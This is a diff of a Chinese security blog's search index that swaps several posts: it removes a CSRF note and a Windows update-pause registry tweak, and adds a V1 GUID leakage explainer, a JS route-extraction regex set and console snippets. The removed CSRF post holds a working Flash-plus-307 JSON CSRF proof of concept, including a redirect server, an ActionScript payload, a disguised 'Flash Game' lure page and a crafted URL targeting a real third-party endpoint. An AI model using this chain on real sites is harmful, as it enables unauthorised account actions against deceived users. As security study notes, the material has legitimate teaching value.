@@ -1,73 +1,107 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CSRF记录</title>
-    <url>/2025/04/17/CSRF%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<h1 id="笔记-CSRF-极简分类"><a href="#笔记-CSRF-极简分类" class="headerlink" title="笔记-CSRF-极简分类"></a>笔记-CSRF-极简分类</h1><p>1-简单</p>
-<p>get+post_forms</p>
-<p>只接受三种类型，text&#x2F;plain、urlendocde、忘了</p>
-<p>2-中等</p>
-<p>限定type，例如最典型的：post-json</p>
-<p>可以尝试几种常见方式 js、flash307、WebSocket、http请求走私等</p>
-<p>*浏览器或者所在浏览的平台安全策略严谨的话建议当它没有csrf</p>
-<p>3-安全</p>
-<p>安全，以目前技术没希望的，或者只能</p>
-<p>钓鱼、xss、cors等联合漏洞实现的</p>
-<hr>
+    <title>Guid-v1参数</title>
+    <url>/2025/06/05/Guid-v1%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
+    <content><![CDATA[<h2 id="详解GUID：结构、版本与V1的安全隐患"><a href="#详解GUID：结构、版本与V1的安全隐患" class="headerlink" title="详解GUID：结构、版本与V1的安全隐患"></a>详解GUID：结构、版本与V1的安全隐患</h2><h3 id="什么是GUID？"><a href="#什么是GUID？" class="headerlink" title="什么是GUID？"></a>什么是GUID？</h3><p>GUID（全局唯一标识符）是一个128位（16字节）的唯一标识符，通常表示为32个十六进制字符（8-4-4-4-12格式）。它在分布式系统中广泛用于生成无需中央协调的唯一ID，例如数据库主键、COM对象标识等。</p>
+<h3 id="GUID结构解析"><a href="#GUID结构解析" class="headerlink" title="GUID结构解析"></a>GUID结构解析</h3><p>一个标准GUID的结构如下（以V1为例）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxxxxxxx-xxxx-Mxxx-Nxxx-xxxxxxxxxxxx</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>M</strong>：版本号（V1为<code>1</code>）</li>
+<li><strong>N</strong>：变体标识（通常为<code>8</code>&#x2F;<code>9</code>&#x2F;<code>A</code>&#x2F;<code>B</code>）</li>
+<li><strong>时间戳</strong>：前60位（高32位 + 中16位的前12位）</li>
+<li><strong>时钟序列</strong>：13-16位（M后4位 + N前2位）</li>
+<li><strong>节点MAC</strong>：最后48位（后6字节）</li>
+</ul>
 <span id="more"></span>
 
-<h2 id="flash方法"><a href="#flash方法" class="headerlink" title="flash方法"></a>flash方法</h2><p>若是服务器只校验post+content-type：json且存在请求体，八成相当于没有csrf</p>
-<p>利用难点：	打开网址A的时候打开网址B</p>
-<p>​			若是网址接收option也可以直接用js操作</p>
-<p>​			服务器对发送种类限制，例如：json</p>
-<p>正常来说没人管这个csrf，毕竟要联合xss或者其他反射的漏洞才能造成较大危害</p>
-<p>可以用（CSRF + Flash + HTTP 307）继续绕过服务器对发送种类限制，例如：json</p>
-<h2 id="绕过json项目："><a href="#绕过json项目：" class="headerlink" title="绕过json项目："></a>绕过json项目：</h2><p><a href="https://github.com/appsecco/json-flash-csrf-poc">json-flash-csrf-poc</a></p>
-<p>*注意：需要用户浏览器启用 Flash</p>
-<p>​    	*<strong>浏览器实现可能不同</strong>  所以 <strong>307 重定向默认会变成 GET 请求</strong>（即使原请求是 POST）</p>
-<p>需要安装mxmlc命令，flex-config.xml内的playerglobal指向的参数可能要更改，以及32.0&#x2F;43或者27.0&#x2F;38</p>
-<h3 id="PoC工作流程"><a href="#PoC工作流程" class="headerlink" title="PoC工作流程"></a>PoC工作流程</h3><p>下面给出的是攻击的整个过程，其中目标用户的浏览器必须启用Flash：</p>
-<p>\1.   用户在浏览器中登录<a href="http://victim-site/">http://victim-site/</a>。</p>
-<p>\2.   用户被重定向到<a href="http://attacker-ip:8000/csrf.swf">http://attacker-ip:8000/csrf.swf</a>。</p>
-<p>\3.   Flash文件加载成功，并向<a href="http://attacker-ip:8000/">http://attacker-ip:8000/</a>发送带有自定义Header的POST Payload。</p>
-<p>\4.   攻击者的服务器发送HTTP 307重定向，这样便能让POST响应body和自定义HTTP头按原样发送到 <a href="http://victim-site/">http://victim-site/</a>。</p>
-<p>\5.   目标用户刷新自己的 <a href="http://victim-site/">http://victim-site/</a> 页面，并发现自己的帐户已经被删除了。</p>
-<h1 id="POC-1"><a href="#POC-1" class="headerlink" title="POC-1"></a>POC-1</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;&#x27;</span></span><br><span class="line">PORT = <span class="number">8000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RedirectHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.path == <span class="string">&#x27;/csrf.swf&#x27;</span>:</span><br><span class="line">            <span class="variable language_">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">            <span class="variable language_">self</span>.send_header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-shockwave-flash&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.end_headers()</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;csrf.swf&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="variable language_">self</span>.wfile.write(f.read())</span><br><span class="line">            <span class="keyword">return</span> </span><br><span class="line">        <span class="variable language_">self</span>.send_response(<span class="number">307</span>)</span><br><span class="line">        <span class="variable language_">self</span>.send_header(<span class="string">&quot;Location&quot;</span>, <span class="string">&quot;http://192.168.43.66:5000/api/test&quot;</span>)</span><br><span class="line">        <span class="comment">##该url为希望执行操作的网址</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.end_headers()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="variable language_">self</span>.path)</span><br><span class="line">        <span class="variable language_">self</span>.do_POST()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    server_class = HTTPServer</span><br><span class="line">    httpd = server_class((HOST, PORT), RedirectHandler)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s Server Starts - %s:%s&#x27;</span> % (time.asctime(), HOST <span class="keyword">or</span> <span class="string">&#x27;0.0.0.0&#x27;</span>, PORT))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        httpd.serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    httpd.server_close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s Server Stops - %s:%s&#x27;</span> % (time.asctime(), HOST <span class="keyword">or</span> <span class="string">&#x27;0.0.0.0&#x27;</span>, PORT))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="V1-GUID的安全问题"><a href="#V1-GUID的安全问题" class="headerlink" title="V1 GUID的安全问题"></a>V1 GUID的安全问题</h3><p>V1 GUID的设计缺陷在于其包含可预测的明文信息：</p>
+<ol>
+<li><strong>MAC地址泄露</strong>：最后6字节直接暴露生成机器的物理地址</li>
+<li><strong>时间戳可逆</strong>：前60位包含精确到100ns的生成时间（从1582年10月15日起）</li>
+<li><strong>序列号可枚举</strong>：时钟序列空间仅14位（16384种可能）</li>
+</ol>
+<h3 id="示例代码：解析V1-GUID"><a href="#示例代码：解析V1-GUID" class="headerlink" title="示例代码：解析V1 GUID"></a>示例代码：解析V1 GUID</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义解析结果结构</span></span><br><span class="line">GUIDv1Info = namedtuple(<span class="string">&#x27;GUIDv1Info&#x27;</span>, [<span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;mac&#x27;</span>, <span class="string">&#x27;clock_seq&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_guidv1</span>(<span class="params">guid_str</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解析V1 GUID并提取敏感信息&quot;&quot;&quot;</span></span><br><span class="line">    guid = uuid.UUID(guid_str)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 验证版本</span></span><br><span class="line">    <span class="keyword">if</span> guid.version != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Not a version 1 GUID&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提取MAC地址 (最后6字节)</span></span><br><span class="line">    mac = <span class="string">&#x27;:&#x27;</span>.join([<span class="string">f&quot;<span class="subst">&#123;guid.<span class="built_in">hex</span>[i:i+<span class="number">2</span>]&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>, <span class="number">32</span>, <span class="number">2</span>)])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提取时钟序列 (13-16位)</span></span><br><span class="line">    clock_seq = ((guid.fields[<span class="number">3</span>] &amp; <span class="number">0x3FFF</span>) &lt;&lt; <span class="number">4</span>) | (guid.fields[<span class="number">4</span>] &gt;&gt; <span class="number">12</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 转换时间戳 (1582年起点)</span></span><br><span class="line">    base_time = datetime.datetime(<span class="number">1582</span>, <span class="number">10</span>, <span class="number">15</span>, tzinfo=datetime.timezone.utc)</span><br><span class="line">    guid_ns = (guid.time - <span class="number">0x01b21dd213814000</span>) * <span class="number">100</span></span><br><span class="line">    gen_time = base_time + datetime.timedelta(microseconds=guid_ns // <span class="number">1000</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> GUIDv1Info(timestamp=gen_time, mac=mac, clock_seq=clock_seq)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例使用</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sample_guid = <span class="string">&quot;c232ab00-9414-11ec-b3c4-00155d3d28d0&quot;</span>  <span class="comment"># V1 GUID</span></span><br><span class="line">    info = parse_guidv1(sample_guid)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] GUID解析结果:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;生成时间: <span class="subst">&#123;info.timestamp.isoformat()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;MAC地址: <span class="subst">&#123;info.mac&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;时钟序列: <span class="subst">&#123;info.clock_seq&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">  import flash.display.Sprite;</span><br><span class="line">  import flash.net.URLLoader;</span><br><span class="line">  import flash.net.URLRequest;</span><br><span class="line">  import flash.net.URLRequestHeader;</span><br><span class="line">  import flash.net.URLRequestMethod;</span><br><span class="line">public class csrf extends Sprite</span><br><span class="line">  &#123;</span><br><span class="line">    public function csrf()</span><br><span class="line">    &#123;</span><br><span class="line">      super();</span><br><span class="line">      var member1:Object = null;</span><br><span class="line">      var myJson:String = null;</span><br><span class="line">      member1 = new Object();</span><br><span class="line">      member1 = &#123;</span><br><span class="line">          &quot;acctnum&quot;:&quot;100&quot;,</span><br><span class="line">          &quot;confirm&quot;:&quot;true&quot;</span><br><span class="line">      &#125;;</span><br><span class="line">      var myData:Object = member1;</span><br><span class="line">      myJson = JSON.stringify(myData);</span><br><span class="line">      var url:String = &quot;http://127.0.0.1:8000&quot;;</span><br><span class="line">      ##该ip为攻击者服务器</span><br><span class="line">      var request:URLRequest = new URLRequest(url);</span><br><span class="line">      request.requestHeaders.push(new URLRequestHeader(&quot;Content-Type&quot;,&quot;application/json&quot;));</span><br><span class="line">      request.data = myJson;</span><br><span class="line">      request.method = URLRequestMethod.POST;</span><br><span class="line">      var urlLoader:URLLoader = new URLLoader();</span><br><span class="line">try</span><br><span class="line">      &#123;</span><br><span class="line">          urlLoader.load(request);</span><br><span class="line">          return;</span><br><span class="line">      &#125;</span><br><span class="line">      catch(e:Error)</span><br><span class="line">      &#123;</span><br><span class="line">          trace(e);</span><br><span class="line">          return;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">###下方代码为伪装的网页，不用也可以，只要输入攻击者ip也会被定向，效果一样的</span><br><span class="line">（会被过滤成get型）</span><br></pre></td></tr></table></figure>
+<h3 id="输出示例"><a href="#输出示例" class="headerlink" title="输出示例"></a>输出示例</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">[+] GUID解析结果:</span><br><span class="line">生成时间: <span class="number">2022</span>-<span class="number">02</span>-<span class="number">18</span>T08:<span class="number">15</span>:<span class="number">45</span>.<span class="number">418000</span>+<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">MAC地址: <span class="number">00</span>:<span class="number">15</span>:<span class="number">5</span>d:<span class="number">3</span>d:<span class="number">28</span>:d0</span><br><span class="line">时钟序列: <span class="number">46020</span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Flash Game - Play Now!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 伪装成正常网页，诱使用户访问 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: Arial, sans-serif;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.flash-container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">20px</span> auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">550px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#f9f9f9</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>🎮 Exciting Flash Game! 🎮<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Click below to play the game (requires Flash Player):<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 嵌入恶意 Flash --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;flash-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">object</span> <span class="attr">width</span>=<span class="string">&quot;550&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;movie&quot;</span> <span class="attr">value</span>=<span class="string">&quot;http://attacker-ip:8000/csrf.swf&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;http://attacker-ip:8000/csrf.swf&quot;</span> <span class="attr">width</span>=<span class="string">&quot;550&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">small</span>&gt;</span>Note: If you see a blank screen, make sure Flash Player is enabled.<span class="tag">&lt;/<span class="name">small</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 额外伪装成正常内容 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-top: 30px;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>This game requires Adobe Flash Player. <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Download here<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="POC-2"><a href="#POC-2" class="headerlink" title="POC-2"></a>POC-2</h1><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">https://www.0xdawn.cn/swf_json_csrf/test.swf?endpoint=https://sim.ecloud.10086.cn:8085/simauth/app/updateAppInfo&amp;reqmethod=POST&amp;ct=application/json;charset=UTF-8&amp;jsonData=&#123;%22appId%22:%22300016001555%22,%22appName%22:%220xdawn%22&#125;&amp;php_url=https://www.0xdawn.cn/swf_json_csrf/test.php</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="csrf漏洞详解网址："><a href="#csrf漏洞详解网址：" class="headerlink" title="csrf漏洞详解网址："></a>csrf漏洞详解网址：</h1><p><a href="https://xz.aliyun.com/news/7506">一次渗透测试引发的Json格式下CSRF攻击的探索-先知社区</a></p>
-<p>..&#x2F;_code&#x2F;csrf</p>
+<h3 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h3><ol>
+<li><p><strong>避免使用V1</strong>：在需要隐私的场景下（如公开API、客户端ID），使用V4随机GUID</p>
+</li>
+<li><p><strong>敏感系统替代方案</strong>：</p>
+<ul>
+<li>数据库自增ID（集中式系统）</li>
+<li>雪花算法（Snowflake）等时间有序但无敏感信息泄露的算法</li>
+<li>ULID&#x2F;CUID等现代替代方案</li>
+</ul>
+</li>
+<li><p><strong>必须使用时的处理</strong>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用随机MAC替代真实MAC</span></span><br><span class="line">uuid.uuid1(node=random.getrandbits(<span class="number">48</span>) | <span class="number">0x010000000000</span>)</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="GUID版本对比"><a href="#GUID版本对比" class="headerlink" title="GUID版本对比"></a>GUID版本对比</h3><table>
+<thead>
+<tr>
+<th align="left">版本</th>
+<th align="left">描述</th>
+<th align="left">安全性</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">V1</td>
+<td align="left">基于时间+MAC</td>
+<td align="left">低（信息泄露）</td>
+</tr>
+<tr>
+<td align="left">V2</td>
+<td align="left">DCE安全版本</td>
+<td align="left">中（已淘汰）</td>
+</tr>
+<tr>
+<td align="left">V3</td>
+<td align="left">基于命名空间MD5</td>
+<td align="left">中（可预测）</td>
+</tr>
+<tr>
+<td align="left">V4</td>
+<td align="left">完全随机</td>
+<td align="left">高（推荐）</td>
+</tr>
+<tr>
+<td align="left">V5</td>
+<td align="left">基于命名空间SHA1</td>
+<td align="left">高</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p><strong>关键结论</strong>：V1 GUID因其设计特性导致严重的信息泄露风险，在现代系统中应优先使用V4随机GUID或其他隐私保护方案。如需时间有序ID，建议采用雪花算法等不包含敏感信息的替代方案。</p>
+</blockquote>
 ]]></content>
       <categories>
         <category>Cybersecurity</category>
       </categories>
       <tags>
-        <tag>web-net</tag>
+        <tag>project</tag>
       </tags>
   </entry>
   <entry>
-    <title>Windows注册表防更新</title>
-    <url>/2024/12/30/Windows%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%98%B2%E6%9B%B4%E6%96%B0/</url>
-    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings]</span><br><span class="line">&quot;FlightSettingsMaxPauseDays&quot;=dword:0000F423F</span><br><span class="line">&quot;PauseFeatureUpdatesStartTime&quot;=&quot;2023-08-06T08:00:00Z&quot;</span><br><span class="line">&quot;PauseFeatureUpdatesEndTime&quot;=&quot;2099-01-19T03:14:07Z&quot;</span><br><span class="line">&quot;PauseQualityUpdatesStartTime&quot;=&quot;2023-08-06T08:00:00Z&quot;</span><br><span class="line">&quot;PauseQualityUpdatesEndTime&quot;=&quot;2099-01-19T03:14:07Z&quot;</span><br><span class="line">&quot;PauseUpdatesExpiryTime&quot;=&quot;2099-01-19T03:14:07Z&quot;</span><br></pre></td></tr></table></figure>
-
+    <title>js排查pages和api</title>
+    <url>/2025/05/30/js%E6%8E%92%E6%9F%A5pages%E5%92%8Capi/</url>
+    <content><![CDATA[<h1 id="述"><a href="#述" class="headerlink" title="述"></a>述</h1><p>注：这个只是为了学习原理，更好的工具推荐是F6JO大佬的bp插件<a href="https://github.com/F6JO/JsRouteScan">JsRouteScan</a></p>
+<p>或者自己访问所有链接把所有js保存到同一目录，再用正则表达式提取比较全面</p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>通过伪造请求头，遍历所有的src跳转链接，保存所有响应为200的js放在同一目录下，用脚本遍历js，过滤出正则表达式对应的前端目录，拼接目录进行如上循环，直到连续两次路径集合相同或达到最大迭代次数，最后对js目录提取规定的正则表达式</p>
 <span id="more"></span>
 
-<p>直接去注册表如下位置添加DWORD(32位)值(D)，值自己设，进制改为10按道理也行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"> </span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings]</span><br><span class="line">&quot;FlightSettingsMaxPauseDays&quot;=dword:00002710</span><br></pre></td></tr></table></figure>
+<p>不足：</p>
+<p>仅仅对url的目录排查和哈希路由排查，后续能力提升可能会功能进行增强</p>
+<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pattern_groups = &#123;</span><br><span class="line">    <span class="string">&quot;PagePath Matches&quot;</span>: [</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;pagePath:\s*&quot;(.*?)&quot;&#x27;</span>), <span class="string">&quot;pagePath_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&quot;pagePath:\s*&#x27;(.*?)&#x27;&quot;</span>), <span class="string">&quot;pagePath_double_quotes&quot;</span>),</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;Path Matches&quot;</span>: [</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;path:\s*&quot;(.*?)&quot;&#x27;</span>), <span class="string">&quot;path_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&quot;path:\s*&#x27;(.*?)&#x27;&quot;</span>), <span class="string">&quot;path_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;url:\s*&quot;([^&quot;]+)&quot;&#x27;</span>), <span class="string">&quot;path_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;url: &quot;([^&quot;]+)&#x27;</span>), <span class="string">&quot;path_double_quotes&quot;</span>),</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;GET Matches&quot;</span>: [</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;get\([^()]*?&quot;([^&quot;]*?)&quot;[^()]*?\)&#x27;</span>), <span class="string">&quot;get_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&quot;get\([^()]*?[&#x27;\&quot;]([^&#x27;\&quot;]*?)[&#x27;\&quot;][^()]*?\)&quot;</span>), <span class="string">&quot;get_double_quotes&quot;</span>),</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;POST Matches&quot;</span>: [</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;post\([^()]*?&quot;([^&quot;]*?)&quot;[^()]*?\)&#x27;</span>), <span class="string">&quot;post_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&quot;POST\([^()]*?[&#x27;\&quot;]([^&#x27;\&quot;]*?)[&#x27;\&quot;][^()]*?\)&quot;</span>), <span class="string">&quot;post_double_quotes&quot;</span>),</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
-        <category>Windows</category>
+        <category>Cybersecurity</category>
       </categories>
       <tags>
-        <tag>Windows update</tag>
+        <tag>project</tag>
       </tags>
   </entry>
   <entry>
@@ -139,23 +173,21 @@
       </tags>
   </entry>
   <entry>
-    <title>js排查pages和api</title>
-    <url>/2025/05/30/js%E6%8E%92%E6%9F%A5pages%E5%92%8Capi/</url>
-    <content><![CDATA[<h1 id="述"><a href="#述" class="headerlink" title="述"></a>述</h1><p>注：这个只是为了学习原理，更好的工具推荐是F6JO大佬的bp插件<a href="https://github.com/F6JO/JsRouteScan">JsRouteScan</a></p>
-<p>或者自己访问所有链接把所有js保存到同一目录，再用正则表达式提取比较全面</p>
-<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>通过伪造请求头，遍历所有的src跳转链接，保存所有响应为200的js放在同一目录下，用脚本遍历js，过滤出正则表达式对应的前端目录，拼接目录进行如上循环，直到连续两次路径集合相同或达到最大迭代次数，最后对js目录提取规定的正则表达式</p>
+    <title>console常见命令</title>
+    <url>/2025/04/29/%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h1 id="控制台命令"><a href="#控制台命令" class="headerlink" title="控制台命令"></a>控制台命令</h1><h4 id="简单document"><a href="#简单document" class="headerlink" title="简单document"></a>简单document</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取所有匹配的 input 元素</span></span><br><span class="line"><span class="keyword">const</span> inputs = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.un-input__inner&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取第一个输入框的值</span></span><br><span class="line"><span class="keyword">const</span> firstInputValue = inputs[<span class="number">0</span>].<span class="property">value</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取第二个输入框的值</span></span><br><span class="line"><span class="keyword">const</span> secondInputValue = inputs[<span class="number">1</span>].<span class="property">value</span>; </span><br></pre></td></tr></table></figure>
+
 <span id="more"></span>
 
-<p>不足：</p>
-<p>仅仅对url的目录排查和哈希路由排查，后续能力提升可能会功能进行增强</p>
